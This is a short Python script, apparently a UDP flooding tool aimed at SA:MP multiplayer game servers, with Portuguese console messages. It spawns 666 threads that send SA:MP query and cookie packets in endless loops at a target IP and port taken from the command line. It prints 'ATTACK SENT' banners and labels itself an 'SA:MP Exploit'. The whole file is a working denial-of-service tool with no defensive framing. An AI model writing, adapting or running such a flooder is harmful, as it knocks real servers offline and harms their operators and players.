import socket
import struct
import codecs,sys
import threading
import random
import time
import os




ip = sys.argv[1]
port = sys.argv[2]
orgip =ip
methods = "UDP"
pps = "139.89.120.22"

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                       ]

os.system('clear')
print("\033[96mATTACK SENT")
time.sleep(2)
os.system("clear")
print("\033[96m ATTACKED SERVER")
print("\033[91mIP:\033[0m%s"%(orgip))
print("\033[92mPORT:\033[0m%s"%(port))
print("\033[93mMETHODS:\033[0m%s"%(methods))
print("\033[94mPPS:\033[0m%s"%(pps))
            





class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))    
                

if __name__ == '__main__':
    try:
     for x in range(666):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print('#########################################################################')
         print('SA:MP Exploit')
         print('#########################################################################')
         print('\n\n')
         print('Ataque para ip {} foi parado'.format(orgip))
         pass